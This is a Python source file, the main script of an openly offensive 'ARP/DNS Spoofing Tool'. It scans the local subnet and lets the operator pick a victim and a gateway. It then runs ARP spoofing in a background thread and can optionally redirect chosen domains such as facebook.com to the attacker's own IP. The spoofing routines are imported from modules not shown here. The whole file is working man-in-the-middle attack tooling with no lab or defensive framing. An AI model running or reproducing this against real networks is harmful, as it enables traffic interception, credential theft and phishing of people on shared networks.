from network_utils import scan_network, get_attacker_ip, get_attacker_mac
from attacks.arp_spoof import start_arp_spoofing
from attacks.dns_spoof import start_dns_spoofer
from scapy.arch import get_if_list
import threading
import signal
import sys

#To remove if useless
#Used to signal threads to stop (not used directly here, but useful for future extension)
#stop_event = threading.Event()

def choose_host(hosts, role):
    print("\nSelect a {}:".format(role))  # Ask the user to choose a role (victim or gateway)
    for i, (ip, mac) in enumerate(hosts):  # Display the list of detected hosts
        print("{}: {} ({})".format(i, ip, mac))
    while True:
        try:
            choice = int(input("Enter index for {}: ".format(role)))  # User selects by index
            return hosts[choice]
        except (ValueError, IndexError):
            print("Invalid selection, try again.")  # Retry on bad input

def main():
    print("=== ARP/DNS Spoofing Tool ===")

    #1. Interface selection
    interfaces = get_if_list()  # List all available network interfaces
    print("\nAvailable network interfaces:")
    for i, iface in enumerate(interfaces):  # Show each interface with its index
        print("{}: {}".format(i, iface))
    while True:
        try:
            iface_idx = int(input("Choose interface index: "))  # User selects an interface
            iface = interfaces[iface_idx]
            break
        except (ValueError, IndexError):
            print("Invalid choice, try again.")

    #2. Get attacker IP and MAC
    attacker_ip = get_attacker_ip(iface)  # Get our own IP on that interface
    attacker_mac = get_attacker_mac(iface)  # Get our MAC address

    #3. Network scan to find hosts
    subnet = ".".join(attacker_ip.split(".")[:-1]) + ".0/24"  # Calculate subnet to scan
    hosts = scan_network(subnet, iface=iface)  # Perform ARP scan

    if len(hosts) < 2:
        print("[-] Not enough devices on network to launch attack.")  # Need at least 2
        sys.exit(1)

    #4. Let user select victim and gateway
    victim_ip, victim_mac = choose_host(hosts, "victim")  # Pick the machine to target
    gateway_ip, gateway_mac = choose_host(hosts, "gateway")  # Pick the router/gateway

    #5. Ask whether to perform DNS spoofing
    spoofed_domains = []
    dns_choice = input("\nEnable DNS spoofing? (y/n): ").strip().lower()
    if dns_choice == "y":
        spoofed_domains = input("Enter comma-separated domains to spoof (e.g. facebook.com,google.com): ").strip().split(",")

    #6. Start ARP spoofing in background thread
    arp_thread = threading.Thread(
        target=start_arp_spoofing,
        args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface),
        daemon=True  # Daemon thread means it will close when main thread ends
    )
    arp_thread.start()

    #7. Ask whether to perform DNS spoofing
    if dns_choice == "y":
        try:
            # Start DNS spoofing (blocking call)
            start_dns_spoofer(
                spoofed_domains=[d.strip() for d in spoofed_domains],
                fake_ip=attacker_ip,
                attacker_mac=attacker_mac,
                iface=iface
            )
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")  # Allow graceful shutdown on Ctrl+C

    else:
        # If only ARP spoofing, just keep the main thread alive
        print("[*] ARP spoofing is running. Press Ctrl+C to stop...")
        try:
            while True:
                signal.pause()  # Wait indefinitely
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")  # End on Ctrl+C

if __name__ == "__main__":
    main()
